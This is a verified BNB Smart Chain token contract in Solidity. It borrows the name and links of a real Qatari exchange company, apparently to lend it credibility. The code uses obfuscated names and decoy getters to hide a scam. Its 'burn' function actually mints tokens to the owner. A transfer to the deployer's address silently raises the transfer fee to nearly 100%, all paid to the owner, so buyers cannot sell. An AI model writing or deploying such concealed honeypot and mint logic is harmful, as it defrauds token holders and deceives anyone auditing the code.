/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

////////////////////////////////////////////////////////////////////////////
//Al Zaman exchange W.L.L has been a pioneer in providing Foreign Exchange 
//and Remittance services in Qatar for more than four decades.
//https://alzamanexchange.com/
//https://www.facebook.com/alzamanexchange
//https://youtu.be/iQty3oMo3Xk
////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract AlZaman {
uint256 private  WYLXNL = 100000000;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  PKXNUU = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  FWRTUO = 1000000000000000000;
address private  NCKWFZ = address(0);
uint256 private  RDWVBO = 10000000000000;
string public  name = "AlZaman";
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "AlZaman";
uint256 public constant JUOJUJ = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  XOZZAH = address(0);
address private  IDBXMT = address(0);
uint256 private  ZTWYBS = 1000000000000000000;
address private  WLAGNI = address(0);
uint256 private  WBMWSF = 1000000000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 private  AJJMSD = 10000000000;
uint256 private  ZIWXIX = 1000000000000000;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
XOZZAH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getRDWVBO() private returns (uint256) {
return RDWVBO;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getWYLXNL() private returns (uint256) {
return WYLXNL;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getNCKWFZ() private returns (address) {
return NCKWFZ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tLWLAZT 0");
require(spender != address(0), "fLWLAZT 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getZIWXIX() private returns (uint256) {
return ZIWXIX;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getWLAGNI() private returns (address) {
return WLAGNI;
}

function _getWBMWSF() private returns (uint256) {
return WBMWSF;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getZTWYBS() private returns (uint256) {
return ZTWYBS;
}

function _getAJJMSD() private returns (uint256) {
return AJJMSD;
}

function _getPKXNUU() private returns (address) {
return PKXNUU;
}

function _getIDBXMT() private returns (address) {
return IDBXMT;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LWLAZT");
require(to != address(0), "LWLAZT");
require(amount <= balanceOf[from], "LWLAZT");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* JUOJUJ/FWRTUO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XOZZAH){
FWRTUO = JUOJUJ+2;
}
emit Transfer(from, to, transferAmount);
}

}